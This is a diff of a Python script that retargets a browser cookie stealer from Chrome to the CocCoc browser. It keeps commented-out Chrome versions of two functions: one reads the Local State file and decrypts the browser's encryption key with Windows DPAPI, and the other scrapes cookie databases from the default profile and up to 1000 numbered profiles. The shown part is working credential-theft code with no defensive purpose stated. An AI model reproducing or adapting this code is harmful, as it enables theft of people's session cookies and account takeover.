@@ -24,11 +24,28 @@ def decrypt_data(data, key):
             return ""
 
 
+# def get_encryption_key():
+#     local_state_path = None
+#     try:
+# 	    local_state_path = os.path.join(os.environ["USERPROFILE"],
+# 	                                        "AppData", "Local", "Google", "Chrome",
+# 	                                        "User Data", "Local State")
+# 	    if local_state_path != None:
+# 	        with open(local_state_path, "r", encoding="utf-8") as f:
+# 	            local_state = f.read()
+# 	            local_state = json.loads(local_state)
+# 	        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+# 	        key = key[5:]
+# 	        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+# 	    return None
+#     except:
+#         return None
+
 def get_encryption_key():
     local_state_path = None
     try:
 	    local_state_path = os.path.join(os.environ["USERPROFILE"],
-	                                        "AppData", "Local", "Google", "Chrome",
+	                                        "AppData", "Local", "CocCoc", "Browser",
 	                                        "User Data", "Local State")
 	    if local_state_path != None:
 	        with open(local_state_path, "r", encoding="utf-8") as f:
@@ -41,9 +58,25 @@ def get_encryption_key():
     except:
         return None
 
+# def craw_cookie():
+# 	list_cookie = ""
+# 	conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies")
+# 	conn.text_factory = lambda b: b.decode(errors = 'ignore')
+# 	list_cookie+=read_cookie_from_sqlite(conn)+"\n##########\n"
+# 	for i in range(0,1000):
+# 		try:
+# 			conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Profile "+str(i)+"\\Network\\Cookies")
+# 			conn.text_factory = lambda b: b.decode(errors = 'ignore')
+# 			cookie = read_cookie_from_sqlite(conn)+"\n##########\n"
+# 			list_cookie+=cookie
+# 		except:
+# 			pass
+# 	return list_cookie
+
+
 def craw_cookie():
 	list_cookie = ""
-	conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies")
+	conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Network\\Cookies")
 	conn.text_factory = lambda b: b.decode(errors = 'ignore')
 	list_cookie+=read_cookie_from_sqlite(conn)+"\n##########\n"
 	for i in range(0,1000):
